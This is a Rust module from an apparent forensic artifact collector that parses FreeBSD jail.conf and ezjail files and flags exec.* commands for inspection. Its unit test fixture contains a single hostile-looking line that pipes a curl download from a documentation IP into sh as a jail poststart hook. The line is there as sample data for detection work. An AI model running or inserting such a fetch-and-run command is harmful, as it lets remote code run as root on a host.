//! FreeBSD jails: `jail.conf` and `jail.conf.d/*` (jail.conf(5)) and ezjail's per-jail files
//! under `usr/local/etc/ezjail/`. One record per parameter. The `exec.*` parameters run
//! commands as root on the host when the jail starts or stops.

use crate::text::{for_each_line, lossy};
use crate::{Artifact, Category, Input, FREEBSD};
use nixcavate_core::{Loc, Record, Result, Sink};
use serde::Serialize;

pub const ARTIFACT: Artifact = Artifact::new(
    "jail-conf",
    "FreeBSD jail definitions and their start/stop commands",
    Category::Containers,
    FREEBSD,
    &["etc/jail.conf", "etc/jail.conf.d/*", "usr/local/etc/ezjail/*"],
    parse,
);

#[derive(Serialize)]
struct Parameter<'a> {
    /// The jail block the parameter is in; empty for global parameters.
    jail: String,
    name: &'a str,
    value: &'a str,
    /// For `exec.*` parameters: the command (the same as `value`), so command checks see it.
    command: &'a str,
}

impl Record for Parameter<'_> {}

fn parse(input: &Input, sink: &mut Sink) -> Result<()> {
    let mut jail = String::new();
    for_each_line(input, |line| {
        let text = lossy(line.bytes);
        let t = text.split(" //").next().unwrap_or_default().trim();
        if t.is_empty() || t.starts_with('#') || t.starts_with("//") || t.starts_with("/*") {
            return Ok(());
        }
        // `name {` opens a block; a line that is just `}` closes it.
        if let Some(head) = t.strip_suffix('{') {
            jail = head.trim().to_string();
            return Ok(());
        }
        if t == "}" {
            jail.clear();
            return Ok(());
        }
        // ezjail writes `export jail_name_exec_start="..."` lines instead of blocks.
        let (name, value) = match super::assignment(t) {
            Some(pair) => pair,
            None => match t.trim_end_matches(';').split_once('=') {
                Some((n, v)) => (n.trim(), v.trim().trim_matches('"')),
                None => (t.trim_end_matches(';'), ""),
            },
        };
        let value = value.trim_end_matches(';').trim_matches('"');
        let command = if name.contains("exec") { value } else { "" };
        sink.emit(Loc::Line(line.number), &Parameter { jail: jail.clone(), name, value, command })
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testing::run;

    #[test]
    fn jail_conf_blocks_and_ezjail_exports() {
        let conf = b"# jails\nexec.timeout = 60;\nweb {\n\tpath = \"/jails/web\";\n\texec.start = \"/bin/sh /etc/rc\";\n\texec.poststart = \"curl -s http://192.0.2.7/x | sh\";\n}\n";
        let out = run(&ARTIFACT, "etc/jail.conf", conf, 0);
        insta::assert_snapshot!(out);
        assert!(out.contains("\"jail\":\"web\",\"name\":\"exec.poststart\""));
        assert!(out.contains("\"jail\":\"\",\"name\":\"exec.timeout\",\"value\":\"60\""));
        let ezjail = run(&ARTIFACT, "usr/local/etc/ezjail/www", b"export jail_www_exec_start=\"/bin/sh /etc/rc\"\n", 0);
        assert!(ezjail.contains("\"name\":\"jail_www_exec_start\""), "{ezjail}");
    }
}
